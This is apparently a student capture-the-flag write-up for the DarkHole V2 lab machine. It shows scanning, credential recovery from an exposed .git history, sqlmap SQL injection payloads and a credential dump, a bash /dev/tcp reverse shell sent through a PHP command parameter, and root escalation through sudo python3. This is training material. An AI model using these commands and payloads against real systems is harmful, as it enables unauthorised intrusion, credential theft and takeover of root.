# CTF 04
> Capture The Flag.
 The flag is stored in the user.txt file.
* IP: 192.168.10.17.

First thing to do is to scan the IP
## nmap

```bash 
$ nmap -sV -Pn -p- -A $IP
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-14 06:40 EDT
Nmap scan report for 192.168.10.17
Host is up (0.0043s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 57:b1:f5:64:28:98:91:51:6d:70:76:6e:a5:52:43:5d (RSA)
|   256 cc:64:fd:7c:d8:5e:48:8a:28:98:91:b9:e4:1e:6d:a8 (ECDSA)
|_  256 9e:77:08:a4:52:9f:33:8d:96:19:ba:75:71:27:bd:60 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: DarkHole V2
| http-git: 
|   192.168.10.17:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: i changed login.php file for more secure 
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 332.80 seconds
```
## gobuster
```bash 

$ gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt                                           
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.10.17
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/06/15 10:49:30 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.git/HEAD            (Status: 200) [Size: 23] 
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/config               (Status: 301) [Size: 315] [--> http://192.168.10.17/config/]
/index.php            (Status: 200) [Size: 740]                                   
/js                   (Status: 301) [Size: 311] [--> http://192.168.10.17/js/]    
/server-status        (Status: 403) [Size: 278]                                   
/style                (Status: 301) [Size: 314] [--> http://192.168.10.17/style/] 
                                                                                  
===============================================================
2022/06/15 10:49:33 Finished
===============================================================
```
So we have this relevant information: 
1. The port `80` is open and listening 
2. The `.git` is reacheable

So if we search the ip in the broswer we can see this is the main page

![Index page DarkHoleV2](https://github.com/PassiDel/IPB_Cybersecurity_CTF/blob/main/ctf4/imagen_2022-06-17_095914094.png)

In this page there is any information relevant or important for us, so we look now in the login.php

![Login page DarkHoleV2](https://github.com/PassiDel/IPB_Cybersecurity_CTF/blob/main/ctf4/imagen_2022-06-17_100010931.png)

Here we can see there is a login page, but we don´t have any credential yet, so we can´t do nothing here.
Lets move to the last thing we can see here the directory `.git`

![.git page DarkHoleV2](https://github.com/PassiDel/IPB_Cybersecurity_CTF/blob/main/ctf4/imagen_2022-06-17_100133653.png)

We can see  in the git history  in the directory `logs` and in the file `COMMIT_EDITMSG` we can read .
>i changed login.php file for more secure

So now that we know there is a vulnerability we want to see the content of the commmits done. There is a usefull tool call git-dumper to see the content of the commits.

So we install it first.
```bash
$ pip install git-dumper

$ git-dumper http://192.168.10.17 ~/website
```
Now that we have stored the content of the web in the our directory `~/website` we are runing the command `git diff` and the commit id for seeing the the login.php that were before.
```bash
$ git diff a4d900a8d85e8938d3601f3cef113ee293028e10

diff --git a/login.php b/login.php
index 8a0ff67..0904b19 100644
--- a/login.php
+++ b/login.php
@@ -2,7 +2,10 @@
 session_start();
 require 'config/config.php';
 if($_SERVER['REQUEST_METHOD'] == 'POST'){
-    if($_POST['email'] == "lush@admin.com" && $_POST['password'] == "321"){
+    $email = mysqli_real_escape_string($connect,htmlspecialchars($_POST['email']));
+    $pass = mysqli_real_escape_string($connect,htmlspecialchars($_POST['password']));
+    $check = $connect->query("select * from users where email='$email' and password='$pass' and id=1");
+    if($check->num_rows){
         $_SESSION['userid'] = 1;
         header("location:dashboard.php");
         die();
```
We use this id because it has as commit message .
>   I added login.php file with default credentials
 
 So now that we have the credentials `lush@admin.com` and `321` as user and password.

 Now we login in and there it is the profil page of our user.
![user page DarkHoleV2](https://github.com/PassiDel/IPB_Cybersecurity_CTF/blob/main/ctf4/imagen_2022-06-17_104736996.png)

Using burpsuite, we can see that the mobile is not encode or parsec so we tried to inject commands and code, but it didn´t work then we noticed that the cookie was there and we used it to do a `sqlmap` saving the burpsuite output in a file called `sql`.  
```bash
$ sqlmap -r request.txt --dbs --batch       
        ___
       __H__                                                                                                       
 ___ ___[)]_____ ___ ___  {1.6.4#stable}                                                                           
|_ -| . [.]     | .'| . |                                                                                          
|___|_  [']_|_|_|__,|  _|                                                                                          
      |_|V...       |_|   https://sqlmap.org                                                                       

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:40:59 /2022-06-15/

[12:40:59] [INFO] parsing HTTP request from 'request.txt'
[12:40:59] [INFO] resuming back-end DBMS 'mysql' 
[12:40:59] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 7829 FROM (SELECT(SLEEP(5)))FOXp) AND 'AndS'='AndS

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: id=-2051' UNION ALL SELECT NULL,NULL,CONCAT(0x716b717871,0x7a5751754e596265786e54434d724b50496467705467475a656f41726a694e7a7a45724d6a674661,0x716a6b7a71),NULL,NULL,NULL-- -
---
[12:40:59] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.0.12
[12:40:59] [INFO] fetching database names
available databases [5]:
[*] darkhole_2
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys

[12:40:59] [INFO] fetched data logged to text files under '/home/pascal/.local/share/sqlmap/output/192.168.10.17'

[*] ending @ 12:40:59 /2022-06-15/

$ sqlmap -r request.txt -D darkhole_2 --dump-all --batch 
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.6.4#stable}                                                                           
|_ -| . ["]     | .'| . |                                                                                          
|___|_  [.]_|_|_|__,|  _|                                                                                          
      |_|V...       |_|   https://sqlmap.org                                                                       

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:41:31 /2022-06-15/

[12:41:31] [INFO] parsing HTTP request from 'request.txt'
[12:41:31] [INFO] resuming back-end DBMS 'mysql' 
[12:41:31] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 7829 FROM (SELECT(SLEEP(5)))FOXp) AND 'AndS'='AndS

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: id=-2051' UNION ALL SELECT NULL,NULL,CONCAT(0x716b717871,0x7a5751754e596265786e54434d724b50496467705467475a656f41726a694e7a7a45724d6a674661,0x716a6b7a71),NULL,NULL,NULL-- -
---
[12:41:31] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 19.10 or 20.10 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.0.12
[12:41:31] [INFO] fetching tables for database: 'darkhole_2'
[12:41:31] [INFO] fetching columns for table 'users' in database 'darkhole_2'
[12:41:31] [INFO] fetching entries for table 'users' in database 'darkhole_2'
Database: darkhole_2
Table: users
[1 entry]
+----+----------------+-------------------------------------------+----------+-----------------+----------------+
| id | email          | address                                   | password | username        | contact_number |
+----+----------------+-------------------------------------------+----------+-----------------+----------------+
| 1  | lush@admin.com |  Street, Pincode, Province/State, Country | 321      | Ayuda por favor | 33             |
+----+----------------+-------------------------------------------+----------+-----------------+----------------+

[12:41:31] [INFO] table 'darkhole_2.users' dumped to CSV file '/home/pascal/.local/share/sqlmap/output/192.168.10.17/dump/darkhole_2/users.csv'                                                                                       
[12:41:31] [INFO] fetching columns for table 'ssh' in database 'darkhole_2'
[12:41:31] [INFO] fetching entries for table 'ssh' in database 'darkhole_2'
Database: darkhole_2
Table: ssh
[1 entry]
+----+------+--------+
| id | pass | user   |
+----+------+--------+
| 1  | fool | jehad  |
+----+------+--------+

[12:41:31] [INFO] table 'darkhole_2.ssh' dumped to CSV file '/home/pascal/.local/share/sqlmap/output/192.168.10.17/dump/darkhole_2/ssh.csv'                                                                                           
[12:41:31] [INFO] fetched data logged to text files under '/home/pascal/.local/share/sqlmap/output/192.168.10.17'

[*] ending @ 12:41:31 /2022-06-15/
```
The ssh auth is `jehad:fool` now that we have this information we are going to connect throw ssh to the machine.

## ssh
```bash
$ ssh jehad@192.168.10.17 -L 9999:localhost:9999
jehad@192.168.10.17s password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 17 Jun 2022 10:30:59 AM UTC

  System load:  0.0                Processes:              239
  Usage of /:   50.7% of 12.73GB   Users logged in:        1
  Memory usage: 20%                IPv4 address for ens33: 192.168.10.17
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri Jun 17 10:29:46 2022 from 192.168.9.4
```
Once we are connected we can finde the user.txt in the directory of `losy`. 
```bash 
jehad@darkhole:/home$ cat losy/user.txt 
cyberctfd{ejkedSmQx5zEBJz9PjE8gTbPkHr839EY}
```
There it's our flag.

## LinPEAS
running linpeas, it shows a cron to start phpserver on `localhost:9999` in `/opt/web/index.php`. `* * * * * losy cd /opt/web && php -S localhost:9999`
```bash 
jehad@darkhole:~$ cat /opt/web/index.php 
<?php
echo "Parameter GET['cmd']";
if(isset($_GET['cmd'])){
echo system($_GET['cmd']);
}
?>
```
This is a console for php.

Now we need a reverse shell doing the next command 
```bash 
$ nc -lvp 1337 
```
We send this command encoded so the the machine open us a terminal 
```bash
$ bash -c 'bash -i >& /dev/tcp/192.168.9.4/1337 0>&1
```
`192.168.10.17:9999/index.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.9.4%2F1337%200%3E%261%27`

Now that we have the reserve shell as losy, lets have a look to the `.bash_history`
```bash
$ ls -lah ~/.bash_history
...
P0assw0rd losy:gang
sudo -l
sudo python3 -c 'import os; os.system("/bin/sh")'
sudo python -c 'import os; os.system("/bin/sh")'
sudo /usr/bint/python3 -c 'import os; os.system("/bin/sh")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
...
```
So now we know that losy cant execute python as root, now we connect via `$ ssh losy@192.168.10.17` we have the password `gang`

```bash 
losy@darkhole:~$ sudo -l
[sudo] password for losy: 
Matching Defaults entries for losy on darkhole:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User losy may run the following commands on darkhole:
    (root) /usr/bin/python3

losy@darkhole:~$ sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
cyberctfd{tuF9WIjTCUGyKe8JVKGmqSaDuHp4mQqc}
```
There it is our valious flag!
